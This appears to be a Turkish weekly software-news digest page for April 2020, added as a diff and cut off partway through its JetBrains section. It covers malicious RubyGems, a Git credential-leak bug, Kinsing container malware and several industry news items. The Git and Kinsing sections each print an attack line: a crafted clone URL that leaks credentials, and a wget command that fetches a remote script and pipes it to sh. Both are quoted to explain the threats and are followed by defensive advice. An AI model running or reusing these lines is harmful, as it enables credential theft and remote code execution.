@@ -1,0 +1,753 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="tr" xml:lang="tr">
+<head>
+<!-- 2021-01-24 Sun 22:46 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Yazılım Gündemi - 2020/15</title>
+<meta name="generator" content="Org mode" />
+<meta name="author" content="Eren Hatırnaz" />
+<style type="text/css">
+ <!--/*--><![CDATA[/*><!--*/
+  .title  { text-align: center;
+             margin-bottom: .2em; }
+  .subtitle { text-align: center;
+              font-size: medium;
+              font-weight: bold;
+              margin-top:0; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { font-family: monospace; color: green; }
+  .priority { font-family: monospace; color: orange; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #ccc;
+    box-shadow: 3px 3px 3px #eee;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: visible;
+    padding-top: 1.2em;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    background-color: white;
+    top: -10px;
+    right: 10px;
+    padding: 3px;
+    border: 1px solid black;
+  }
+  pre.src:hover:before { display: inline;}
+  /* Languages per Org manual */
+  pre.src-asymptote:before { content: 'Asymptote'; }
+  pre.src-awk:before { content: 'Awk'; }
+  pre.src-C:before { content: 'C'; }
+  /* pre.src-C++ doesn't work in CSS */
+  pre.src-clojure:before { content: 'Clojure'; }
+  pre.src-css:before { content: 'CSS'; }
+  pre.src-D:before { content: 'D'; }
+  pre.src-ditaa:before { content: 'ditaa'; }
+  pre.src-dot:before { content: 'Graphviz'; }
+  pre.src-calc:before { content: 'Emacs Calc'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-fortran:before { content: 'Fortran'; }
+  pre.src-gnuplot:before { content: 'gnuplot'; }
+  pre.src-haskell:before { content: 'Haskell'; }
+  pre.src-hledger:before { content: 'hledger'; }
+  pre.src-java:before { content: 'Java'; }
+  pre.src-js:before { content: 'Javascript'; }
+  pre.src-latex:before { content: 'LaTeX'; }
+  pre.src-ledger:before { content: 'Ledger'; }
+  pre.src-lisp:before { content: 'Lisp'; }
+  pre.src-lilypond:before { content: 'Lilypond'; }
+  pre.src-lua:before { content: 'Lua'; }
+  pre.src-matlab:before { content: 'MATLAB'; }
+  pre.src-mscgen:before { content: 'Mscgen'; }
+  pre.src-ocaml:before { content: 'Objective Caml'; }
+  pre.src-octave:before { content: 'Octave'; }
+  pre.src-org:before { content: 'Org mode'; }
+  pre.src-oz:before { content: 'OZ'; }
+  pre.src-plantuml:before { content: 'Plantuml'; }
+  pre.src-processing:before { content: 'Processing.js'; }
+  pre.src-python:before { content: 'Python'; }
+  pre.src-R:before { content: 'R'; }
+  pre.src-ruby:before { content: 'Ruby'; }
+  pre.src-sass:before { content: 'Sass'; }
+  pre.src-scheme:before { content: 'Scheme'; }
+  pre.src-screen:before { content: 'Gnu Screen'; }
+  pre.src-sed:before { content: 'Sed'; }
+  pre.src-sh:before { content: 'shell'; }
+  pre.src-sql:before { content: 'SQL'; }
+  pre.src-sqlite:before { content: 'SQLite'; }
+  /* additional languages in org.el's org-babel-load-languages alist */
+  pre.src-forth:before { content: 'Forth'; }
+  pre.src-io:before { content: 'IO'; }
+  pre.src-J:before { content: 'J'; }
+  pre.src-makefile:before { content: 'Makefile'; }
+  pre.src-maxima:before { content: 'Maxima'; }
+  pre.src-perl:before { content: 'Perl'; }
+  pre.src-picolisp:before { content: 'Pico Lisp'; }
+  pre.src-scala:before { content: 'Scala'; }
+  pre.src-shell:before { content: 'Shell Script'; }
+  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
+  /* additional language identifiers per "defun org-babel-execute"
+       in ob-*.el */
+  pre.src-cpp:before  { content: 'C++'; }
+  pre.src-abc:before  { content: 'ABC'; }
+  pre.src-coq:before  { content: 'Coq'; }
+  pre.src-groovy:before  { content: 'Groovy'; }
+  /* additional language identifiers from org-babel-shell-names in
+     ob-shell.el: ob-shell is the only babel language using a lambda to put
+     the execution function name together. */
+  pre.src-bash:before  { content: 'bash'; }
+  pre.src-csh:before  { content: 'csh'; }
+  pre.src-ash:before  { content: 'ash'; }
+  pre.src-dash:before  { content: 'dash'; }
+  pre.src-ksh:before  { content: 'ksh'; }
+  pre.src-mksh:before  { content: 'mksh'; }
+  pre.src-posh:before  { content: 'posh'; }
+  /* Additional Emacs modes also supported by the LaTeX listings package */
+  pre.src-ada:before { content: 'Ada'; }
+  pre.src-asm:before { content: 'Assembler'; }
+  pre.src-caml:before { content: 'Caml'; }
+  pre.src-delphi:before { content: 'Delphi'; }
+  pre.src-html:before { content: 'HTML'; }
+  pre.src-idl:before { content: 'IDL'; }
+  pre.src-mercury:before { content: 'Mercury'; }
+  pre.src-metapost:before { content: 'MetaPost'; }
+  pre.src-modula-2:before { content: 'Modula-2'; }
+  pre.src-pascal:before { content: 'Pascal'; }
+  pre.src-ps:before { content: 'PostScript'; }
+  pre.src-prolog:before { content: 'Prolog'; }
+  pre.src-simula:before { content: 'Simula'; }
+  pre.src-tcl:before { content: 'tcl'; }
+  pre.src-tex:before { content: 'TeX'; }
+  pre.src-plain-tex:before { content: 'Plain TeX'; }
+  pre.src-verilog:before { content: 'Verilog'; }
+  pre.src-vhdl:before { content: 'VHDL'; }
+  pre.src-xml:before { content: 'XML'; }
+  pre.src-nxml:before { content: 'XML'; }
+  /* add a generic configuration mode; LaTeX export needs an additional
+     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
+  pre.src-conf:before { content: 'Configuration File'; }
+
+  table { border-collapse:collapse; }
+  caption.t-above { caption-side: top; }
+  caption.t-bottom { caption-side: bottom; }
+  td, th { vertical-align:top;  }
+  th.org-right  { text-align: center;  }
+  th.org-left   { text-align: center;   }
+  th.org-center { text-align: center; }
+  td.org-right  { text-align: right;  }
+  td.org-left   { text-align: left;   }
+  td.org-center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara { display: inline; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .equation-container {
+    display: table;
+    text-align: center;
+    width: 100%;
+  }
+  .equation {
+    vertical-align: middle;
+  }
+  .equation-label {
+    display: table-cell;
+    text-align: right;
+    vertical-align: middle;
+  }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  .org-svg { width: 90%; }
+  /*]]>*/-->
+</style>
+<link rel="stylesheet" href="../../../css/org.css" type="text/css" />
+<script type="text/javascript">
+/*
+@licstart  The following is the entire license notice for the
+JavaScript code in this tag.
+
+Copyright (C) 2012-2020 Free Software Foundation, Inc.
+
+The JavaScript code in this tag is free software: you can
+redistribute it and/or modify it under the terms of the GNU
+General Public License (GNU GPL) as published by the Free Software
+Foundation, either version 3 of the License, or (at your option)
+any later version.  The code is distributed WITHOUT ANY WARRANTY;
+without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.
+
+As additional permission under GNU GPL version 3 section 7, you
+may distribute non-source (e.g., minimized or compacted) forms of
+that code without the copy of the GNU GPL normally required by
+section 4, provided you include this license notice and a URL
+through which recipients can access the Corresponding Source.
+
+
+@licend  The above is the entire license notice
+for the JavaScript code in this tag.
+*/
+<!--/*--><![CDATA[/*><!--*/
+ function CodeHighlightOn(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(null != target) {
+     elem.cacheClassElem = elem.className;
+     elem.cacheClassTarget = target.className;
+     target.className = "code-highlighted";
+     elem.className   = "code-highlighted";
+   }
+ }
+ function CodeHighlightOff(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(elem.cacheClassElem)
+     elem.className = elem.cacheClassElem;
+   if(elem.cacheClassTarget)
+     target.className = elem.cacheClassTarget;
+ }
+/*]]>*///-->
+</script>
+</head>
+<body>
+<div id="content">
+<h1 class="title">Yazılım Gündemi - 2020/15
+<br />
+<span class="subtitle">13-19 Nisan 2020</span>
+</h1>
+<div id="table-of-contents">
+<h2>İçindekiler</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#org0bc61ab">1. 725 adet zararlı Ruby kütüphanesi RubyGems üzerinden kaldırıldı</a></li>
+<li><a href="#orga1765f2">2. Zararlı URL ile şifre çalmaya yarayan Git açığı kapatılı</a></li>
+<li><a href="#orgfee186a">3. Konteynerleri tehdit eden yeni bir zararlı yazılım: Kinsing Malware</a></li>
+<li><a href="#org8fc6fce">4. Bakan Varank: "Yazılım Okulları Açacağız"</a></li>
+<li><a href="#org6fe5bc1">5. GitHub takımlar için de ücretsiz oldu</a></li>
+<li><a href="#org6be9fdf">6. Google Play Store Policy güncellendi: Arka planda konum servisi kullanan uygulamalar özel izin almak zorunda</a></li>
+<li><a href="#orgd6c7979">7. JetBrains birçok IDE ve aracı için 2020.1 sürümünü yayınladı</a></li>
+<li><a href="#orgfd9b4fc">8. "Açık Seminer" etkinlikleri devam ediyor</a></li>
+<li><a href="#orgd67faa8">9. Diğer Haberler</a></li>
+<li><a href="#org1786ba6">10. Lisans</a></li>
+</ul>
+</div>
+</div>
+
+<div class="figure">
+<p><img src="gorseller/yazilim-gundemi-banner.png" alt="yazilim-gundemi-banner.png" />
+</p>
+</div>
+
+<div class="org-center">
+<p>
+<a href="../14/yazilim-gundemi-2020-14.html">&lt; Önceki Gündem</a> | <b>13-19 Nisan 2020</b> | <a href="../16/yazilim-gundemi-2020-16.html">Sonraki Gündem &gt;</a>
+</p>
+
+<p>
+<a href="https://teknoseyir.com/blog/yazilim-gundemi-2020-15">TeknoSeyir'de Oku</a>
+</p>
+</div>
+
+<div id="outline-container-org0bc61ab" class="outline-2">
+<h2 id="org0bc61ab"><span class="section-number-2">1</span> 725 adet zararlı Ruby kütüphanesi <a href="https://www.zdnet.com/article/clipboard-hijacking-malware-found-in-725-ruby-libraries/">RubyGems üzerinden kaldırıldı</a></h2>
+<div class="outline-text-2" id="text-1">
+<p>
+Büyük ve orta ölçekli uygulamaları üçüncü parti kütüphane kullanmadan
+geliştirmenin pek mümkün olmadığı günümüz yazılım ekosisteminde, kötü amaçlı
+kişiler artık sadece son kullanıcıları değil, biz geliştiricileri de hedef
+alıyorlar. ReversingLabs isimli güvenlik firmasının bu hafta yayınladığı <a href="https://blog.reversinglabs.com/blog/mining-for-malicious-ruby-gems">bir
+blog yazısı</a> 2020 Şubat ayında yaşanmış ve çözümlenmiş bir olaya ışık tutuyor.
+</p>
+
+<p>
+ReversingLabs firması Şubat ayında 725 adet yeni RubyGems (Ruby programlama
+dilinin üçüncü parti kütüphaneleri kayıt etmek için kullandığı sistem) kaydı
+tespit etmişler ve incelediklerinde de bu kütüphanelerin kötü amaçlı kod
+satırları içerdiklerini keşfetmişler. "<i>JimCarrey</i>" ve "<i>PeterGibbons</i>"
+şeklinde takma isimlerle RubyGems üzerinden paylaşılmış, isim oyunu içeren bu
+kütüphaneler güvenlik firmasının tespit etmesi ve RubyGems'e bildirmesi
+üzerine sistemden silindiler fakat silinene kadar geçen süre boyunca binlerce
+kez indirildikleri de gözden kaçmıyor. RubyGems üzerinden silinen bu
+kütüphanelerin tam listesi için <a href="https://blog.reversinglabs.com/hubfs/Blog/ruby_malicious_gems.txt">buraya tıklayabilirsiniz</a>.
+</p>
+
+<p>
+Kötü amaçlı kişiler yine isim oyunları yaparak aradan sıvışmaya çalışmışlar.
+Mesela "atlas_client" isimli bir kütüphanenin sahtesini "atlas-client" ismiyle
+yayınlamışlar. Peki ne yapıyor bu kötü amaçlı kütüphaneler?
+</p>
+
+
+<div class="figure">
+<p><img src="gorseller/ruby-zararli.png" alt="ruby-zararli.png" />
+</p>
+<p><span class="figure-number">Şekil 2: </span>Zararlı yazılımın sisteme nasıl eklendiğini gösteren akış şeması. Kaynak: <a href="https://blog.reversinglabs.com/blog/mining-for-malicious-ruby-gems">ReversingLabs</a></p>
+</div>
+
+<p>
+Bu kütüphanelerin yaptığı şey Windows sistemlere bilgisayarın açılmasıyla
+birlikte çalışacak bir Clipboard Hijack betiği kuruyor. Yani kes, kopyala,
+yapıştır gibi işlemlerin yapılabilmesini sağlayan "pano" sistemini manipüle
+ediyor. Bilgisayarınızın arkaplanında çalışan bu Visual Basic betiği sonsuz
+döngüye girmiş şekilde sürekli panoya kopyaladığınız metinleri kontrol ediyor,
+eğer bunun bir BitCoin cüzdanı adresi olduğunu anlarsa, o metini başka bir
+BitCoin cüzdanı adresi ile değiştiriyor. Yani kısaca sizin başkasına
+göndereceğiniz parayı kendisine aktarmak istiyor.
+</p>
+
+<p>
+Yine güvenlik firmasının açıklamasına göre saldırganın ilgili BitCoin
+cüzdanına hiçbir para transferi gerçekleşmemiş. Zaten düşük bir olasılıktı.
+Yazdığın sahte kütüphaneyi Windows kullanan bir yazılım geliştirici indirecek,
+o yazılım geliştirici BitCoin'i aktif olarak kullanıyor olacak ve bir para
+tranferi yapacağı zaman adamın panosunu manipüle edip, parayı kendine
+çekeceksin. Ohoo&#x2026; Ölme eşeğim ölme. İlginç bir kafa gerçekten. Saldırgan
+amacına ulaşamadan gönderdiği sahte kütüphaneler silinmiş ama eğer
+indirilmişse sizin bilgisayarınızdan silinmemiştir. Ruby dili üzerinde aktif
+geliştirme yapıyor ve Windows kullanıyorsanız sisteminizle birlikte başlayan
+uygulamaları bir kontrol etmenizde fayda var.
+</p>
+</div>
+</div>
+<div id="outline-container-orga1765f2" class="outline-2">
+<h2 id="orga1765f2"><span class="section-number-2">2</span> Zararlı URL ile şifre çalmaya yarayan <a href="https://github.com/git/git/security/advisories/GHSA-qm7j-c969-7j4q">Git açığı kapatılı</a></h2>
+<div class="outline-text-2" id="text-2">
+<p>
+Google'ın Project Zero isimli güvenlik takımı tarafından ortaya çıkarılan ve
+<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2021">raporlanan güvenlik açığı</a> bu hafta içerisinde yayınlanan Git sürümleriyle
+birlikte kapatıldı. CVE numarası: <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-5260">CVE-2020-5260</a>
+</p>
+
+<p>
+Git bazı kimlik doğrulama işlemleri için işletim sistemi tarafından sağlanmış
+harici yardımcı araçları kullanıyor. Fakat "git clone" gibi komutlardan
+girilen zararlı URL'ler, bu harici kimlik doğrulama araçlarında hata yol açıp,
+sistemde kayıtlı kimlik bilgilerini (kullanıcı adı, şifre, ssh anahtarı vb.)
+başka bir sunucuya yönlendirebiliyor. Örnek vermek gerekirse:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell">git clone <span class="org-string">'https://example.com?%0ahost=github.com'</span>
+</pre>
+</div>
+
+<p>
+şeklinde çalıştırılan bir komut <code>github.com</code> için depolanmış kimlik
+bilgilerini <code>example.com</code> sitesine yönlendiriyor. Elbette benim gibi siz de
+ilk bakışta "böyle bariz şüpheli bir komutu kim, niye çalıştırsın?"
+diyebilirsiniz fakat bu bağlantılar her zaman böyle açık şekilde olmuyor.
+Örneğin, bir depo içerisine başka bir depoyu eklemeye yarayan Git'in Submodule
+sistemi böyle bir zaafiyete kurban gidebilir. Siz depoyu normal bir şekilde
+sunucudan bilgisayarına çekebilirsiniz fakat Git, Submodule olarak eklenen
+diğer depoları çekerken böyle bir bağlantı ile karşılaşırsa haberiniz
+olmayabilir.
+</p>
+
+<p>
+Neyse ki bu güvenlik sorunu halka açık olarak paylaşılmadan önce kapatılmış.
+Git versiyonlarınızı güncelleyerek olası bir zararın önüne geçmiş olursunuz.
+Eğer Git versiyonunuzu yükseltebilecek durumda değilseniz aşağıdaki şeyleri
+yapmanızda fayda var:
+</p>
+
+<ul class="org-ul">
+<li><p>
+Bu komutları çalıştırarak Git'in harici kimlik doğrulama yardımcılarını
+kullanmasını önleyebilirsiniz:
+</p>
+<div class="org-src-container">
+<pre class="src src-shell">$ git config --unset credential.helper
+$ git config --global --unset credential.helper
+$ git config --system --unset credential.helper
+</pre>
+</div></li>
+<li>İndirdiğiniz depolar içerisindeki <code>.gitmodules</code> dosyasını inceleyebilir ve
+şüpheli bir durum görmezseniz işlemlerinize devam edebilirsiniz.</li>
+</ul>
+
+<p>
+Güvenlik açığı hakkında daha detaylı bilgi edinmek isterseniz konu başlığına
+eklediğim bağlantıya ya da Google'ın Project Zero takımının <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2021">şu yazısına</a> göz
+atabilirsiniz.
+</p>
+</div>
+</div>
+<div id="outline-container-orgfee186a" class="outline-2">
+<h2 id="orgfee186a"><span class="section-number-2">3</span> Konteynerleri tehdit eden <a href="https://blog.aquasec.com/threat-alert-kinsing-malware-container-vulnerability">yeni bir zararlı yazılım</a>: Kinsing Malware</h2>
+<div class="outline-text-2" id="text-3">
+<p>
+Linux çekirdeğinin içerisinde olan fakat Docker ile birlikte popülerliği
+artmış olan konteyner yapısı artık günümüzde birçok şirket ve kurum tarafından
+kullanılıyor. Yeni teknolojiler biz geliştiricilerin olduğu gibi kötü amaçlı
+kişilerin de ilgisini çekiyor. Aqua isimli konteyner güvenliği üzerine çalışan
+firmanın geçtiğimiz hafta blogunda yayınladığı yazı ile konteyner içerisinde
+kripta para madenciliği yapan yeni bir malware ortaya çıktı. İsmine "Kinsing"
+demişler.
+</p>
+
+<p>
+Bu malware yazılımının sisteminize sızabilmesi için bir kriter var. O da
+yanlış ayarlanmış ve açık bırakılmış Docker Daemon API'sinin portu. Kötü
+amaçlı kişiler bu açık portu otomatik olarak bulan ve kendi amacı için
+kullanan exploit geliştirmişler. Bu exploit'in yaptığı ilk iş yeni bir Ubuntu
+konteyner'i oluşturmak ve içerisinde aşağıdaki komutu çalıştırmak:
+</p>
+<div class="org-src-container">
+<pre class="src src-bash">/bin/bash -c apt-get update &amp;&amp; apt-get install -y wget cron;service cron start; wget -q -O - 142.44.191.122/d.sh | sh;tail -f /dev/null
+</pre>
+</div>
+<p>
+GNU/Linux sistemlere aşina olmayanlar için açıklamak gerekirse bu komutun
+yaptığı iş:
+</p>
+<ol class="org-ol">
+<li><code>apt-get update</code>: Tüm paket depolarını güncelliyor.</li>
+<li><code>apt-get install -y wget cron</code>: <b>wget</b> ve <b>cron</b> araçlarını kuruyor.</li>
+<li><code>wget -q -O - 142.44.191.122/d.sh | sh</code>: <b>wget</b>'i kullanarak asıl zararlı
+yazılımı indiriyor ve çalıştırıyor.</li>
+<li><code>tail -f /dev/null</code>: /dev/null dosyasını sürekli yazdırarak konteyner'i
+ayakta tutmaya çalışıyor.</li>
+</ol>
+
+<p>
+Asıl zararlı yazılım ise bazı güvenlik duvarlarını devre dışı bırakarak
+kendini genişletmeye ve sistem kaynaklarınızı kullanarak kripto para
+madenciliği yapıyor.
+</p>
+
+
+<div class="figure">
+<p><img src="gorseller/docker-kinsing.jpg" alt="docker-kinsing.jpg" />
+</p>
+<p><span class="figure-number">Şekil 3: </span>Zararlı yazılımın tüm süreçlerini gösteren diyagram. Kaynak: <a href="https://blog.aquasec.com/threat-alert-kinsing-malware-container-vulnerability">Aqua</a></p>
+</div>
+
+<p>
+Eğer kişisel olarak ya da firmanızda Docker kullanıyorsanız gerekli
+kontrolleri yapmayı ihmal etmeyin. Zararlı yazılım hakkında daha detaylı bilgi
+ve önlemler için konu başlığına eklediğim bağlantıya tıklayabilirsiniz.
+</p>
+</div>
+</div>
+<div id="outline-container-org8fc6fce" class="outline-2">
+<h2 id="org8fc6fce"><span class="section-number-2">4</span> Bakan Varank: "<a href="https://www.sanayi.gov.tr/medya/haber-detayi/gLAYI4bI8x59">Yazılım Okulları Açacağız</a>"</h2>
+<div class="outline-text-2" id="text-4">
+<p>
+Geçtiğimiz haftaki yazılım gündemi yazısını (bkz: <a href="../14/yazilim-gundemi-2020-14.html">Yazılım Gündemi - 2020/14</a>)
+son anda güncelleyerek "<a href="https://www.acikseminer.com/">Açık Seminer</a>" etkinliğinin başlayacağını duyurmuştum.
+Etkinlik önümüzdeki haftalarda da devam edecek. Bu etkinliklerin ilk gününde
+Sanayi ve Teknoloji Bakanı Mustafa Varank da katılım gösterdi ve bazı
+açıklamalarda bulundu. Özetleyecek olursak:
+</p>
+
+<ul class="org-ul">
+<li>"<a href="https://www.turkiyeacikkaynakplatformu.com/">Türkiye Açık Kaynak Platformu</a>nda 60'ı aşkın şirket, 50'den fazla
+üniversite, sektör temsilcisi STK ve topluluk üyesi binlerce yazılımcı
+bulunuyor. Burada sadece yazılım geliştirenler değil, yeni teknolojilerde
+yazılım ihtiyacı olan şirketler de bizim paydaşımız. Platform aracılığıyla
+ihtiyaç sahibiyle yazılım geliştiricileri bir araya getiriyoruz".</li>
+<li>Platformun gelecek 2 yıllık çalışma programı hazır.</li>
+<li>Bilişim Vadisi ve TÜBİTAK-TÜSSİDE ile birlikte yürütülen bu programa,
+İstanbul ve Doğu Marmara kalkınma ajanları 30 milyon liralık katkı
+sunacakmış.</li>
+<li>2023 Sanayi ve Teknoloji Stratejisi kapsamında 500.000 yazılımcı ve
+yazılımda küresel ürünler geliştiren bir ülke olma hedefi var. Şu an
+ülkemizde 150.000'in üzerinde yazılım geliştirici varmış.</li>
+<li>İstanbul'da ve Bilişim Vadisi'nde Yazılım Okulları açılacakmış.</li>
+<li>"Seminer programının ardından, farklı yaş gruplarını ve yetkinlikleri
+hedefleyen eğitim programlarımız başlayacak. Eğitimleri başarıyla
+tamamlayan katılımcılara, dijital rozet vereceğiz"</li>
+</ul>
+
+<p>
+Diğer birçok ülkenin de açık kaynak ve yazılımla ilgili doğrudan kurumlar
+kurduğu günümüz ekosisteminde bence doğru bir hareket. Ülke olarak bu akımı
+yakalayabilmiş olmak umut vaat ediyor. Umarım ilerleyen süreçlerde planlar
+hakkında daha detayları açıklamalar da gelir. Her ne kadar "Açık Kaynak"tan
+ziyade "Özgür Yazılım" kavramını daha çok destekliyor olsam da devletlerin
+"Açık Kaynak" tarafına yönelmesini de anlayabiliyorum.
+</p>
+
+<p>
+Önümüzdeki haftalarda da devam edecek "Açık Seminer" etkinliklerini takip
+etmek için bu sayfayı ziyaret edebilirsiniz: <a href="https://www.acikseminer.com/">https://www.acikseminer.com/</a>
+</p>
+</div>
+</div>
+<div id="outline-container-org6fe5bc1" class="outline-2">
+<h2 id="org6fe5bc1"><span class="section-number-2">5</span> GitHub takımlar için de <a href="https://github.blog/2020-04-14-github-is-now-free-for-teams/">ücretsiz oldu</a></h2>
+<div class="outline-text-2" id="text-5">
+<p>
+Geçtiğimiz yazılım gündemi yazılarının birinde GitHub'da kullanıcı olarak özel
+depo (private repository) açmanın ücretsiz olduğunu konuşmuştuk diye
+hatırlıyorum (hangi yazı olduğunu bulamadım :) ). Bu hafta ise GitHub
+yayınladığı blog yazısı ile birlikte artık takımlar içi de GitHub Free
+paketinin bulunduğunu açıkladı. Ayrıca GitHub Teams paketinin kullanıcı başına
+aylık $9 olan ücretini de $4 olarak güncelledi.
+</p>
+
+<p>
+Ücretsiz paketle birlikte artık özel depoların temel tüm özelliklerine
+ücretsiz olarak erişebilecek firmalar. Ayrıca 500MB GitHub Packages ve 2.000
+dakika GitHub Actions hizmetleri de ücretsiz pakete dahil. Ücretli olarak
+kullanmaya devam edecek ve yıllık olarak GitHub Teams satın almış firmalar
+ve organizasyonlar için de kalan ayların ücretleri de iade edilecek.
+</p>
+
+
+<div class="figure">
+<p><img src="gorseller/github-free-limits.png" alt="github-free-limits.png" height="400" />
+</p>
+<p><span class="figure-number">Şekil 4: </span>Ücretli GitHub Teams paketinden ücretsiz pakete geçerken kaybedilen özellikler</p>
+</div>
+
+<p>
+Yukarıdaki görselde de görebileceğiniz gibi birçok faydalı özellik ücretsiz
+sürümde yok. Bu özelliklere ihtiyaç duyan firmalar ve kurumların geçiş
+yapacaklarını sanmıyorum ama "bunlar olmasa da olur" diyenler için iyi bir
+tasarruf.
+</p>
+</div>
+</div>
+<div id="outline-container-org6be9fdf" class="outline-2">
+<h2 id="org6be9fdf"><span class="section-number-2">6</span> Google Play Store Policy <a href="https://www.androidpolice.com/2020/04/16/play-store-app-policy-changes-misleading-subscriptions-android-11-location/">güncellendi</a>: Arka planda konum servisi kullanan uygulamalar özel izin almak zorunda</h2>
+<div class="outline-text-2" id="text-6">
+<p>
+Google'ın Android için uygulama ve içerik mağazası olan Play Store'da uygulama
+yayınlamak için uyulması gereken Policy dokümanı güncellendi. Artık
+kullanıcıya bir süreliğine ücretsiz sunulan daha sonra ücretli hale gelen
+uygulamalar detay vermek zorunda ve ondan da önemlisi artık uygulamanız
+arka planda konum servisini kullanmak istiyorsa Google'dan özel olarak izinli
+olması gerekiyor.
+</p>
+
+
+<div class="figure">
+<p><img src="gorseller/play-store-policy.png" alt="play-store-policy.png" />
+</p>
+<p><span class="figure-number">Şekil 5: </span>Artık uygulamanız kullanıcıya soldaki gibi ücretsiz süreç hakkında detaylı bilgiler vermek zorunda, sağdaki kullanıma izin verilmiyor.</p>
+</div>
+
+<p>
+Eğer kullanıcılar yine de dikkatsiz davranıp bu açıklamaları görmezden gelirse
+diye Google önlemini almış. Ücretsiz kullanım süreci bitmeden önce kullanıcıya
+e-posta atarak durum hakkında bilgi vermek zorundasınız. Ayrıca aktif
+aboneliği olan fakat uygulamayı silmiş kullanıcılar da bildirimlerle
+uyarılacakmış, "uygulamayı silmek abonelikten çıkmak anlamına gelmiyor"
+şeklinde. Bence gayet yerinde uygulamalar.
+</p>
+
+<p>
+Diğer bir konumuz ise arka planda konum bilgilerini kullanan uygulamaları
+ilgilendiriyor. Artık uygulamanız arka planda konum bilgilerine de erişmek
+istiyorsa özel olarak Google'a başvurmanız ve beyaz listeye (whitelist)
+girebilmek için Google'ı neden arka planda konum bilgisine ihtiyaç duyduğunuz
+konusunda ikna etmeniz gerekiyor. Reklam gösterme ve analiz için kullanımlar
+kabul edilmeyecekmiş. Yani Google diyor ki: "Benim dışımda kimse
+kullanıcıların konum bilgileriyle reklam gösteremez ve analiz yapamaz". Pek
+şaşırdığımı söyleyemem açıkcası.
+</p>
+
+<p>
+Arka planda konum bilgisini alıp bunu kötüye kullanan uygulamaların olduğu bir
+gerçek elbette fakat bu sorunun önüne geçmek için uydurulan çözüm bana biraz
+sakıncalı geldi. Eğer Google'ın kendi çözümü olan bir alanda hizmet veriyorsak
+(yani bir nevi Google'a rakipsek), Google bizim uygulamamızı beyaz listeye
+eklemeyebilir. Nitekim reklam gösterme ve analiz için en başından kısıtlanmış
+zaten. Bu sürecin şeffaflığı nasıl sağlanacak? sorusunun sorulması önemli.
+</p>
+
+<p>
+Bu konuda siz ne düşünüyorsunuz. Yorumlar bölümünde konuşalım.
+</p>
+
+<p>
+Arka planda konum bilgisi kullanımı için daha detaylı bilgi için Google'ın
+hazırladığı <a href="https://support.google.com/googleplay/android-developer/answer/9799150">bu sayfayı</a> ziyaret edebilirsiniz.
+</p>
+</div>
+</div>
+<div id="outline-container-orgd6c7979" class="outline-2">
+<h2 id="orgd6c7979"><span class="section-number-2">7</span> JetBrains birçok IDE ve aracı için 2020.1 sürümünü yayınladı</h2>
+<div class="outline-text-2" id="text-7">
+<p>
+JetBrains firmasının Nisan ayı itibariyle yayınladığı güncellemeler bu
+şekilde:
+</p>
+
+<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
+
+
+<colgroup>
+<col  class="org-left" />
+
+<col  class="org-left" />
+</colgroup>
+<thead>
+<tr>
+<th scope="col" class="org-left">IDE'ler</th>
+<th scope="col" class="org-left">Araçlar</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="org-left">* <a href="https://blog.jetbrains.com/phpstorm/2020/04/phpstorm-2020-1-release/">PhpStorm 2020.1</a></td>
+<td class="org-left">* <a href="https://www.jetbrains.com/resharper/whatsnew/">ReSharper 2020.1</a></td>
+</tr>
+
+<tr>
+<td class="org-left">* <a href="https://www.jetbrains.com/clion/whatsnew/">CLion 2020.1</a></td>
+<td class="org-left">* <a href="https://blog.jetbrains.com/blog/2020/04/16/edutools-v-3-6/">EduTools 3.5</a></td>
+</tr>
+
+<tr>
+<td class="org-left">* <a href="https://www.jetbrains.com/datagrip/whatsnew/">DataGrid 2020.1</a></td>
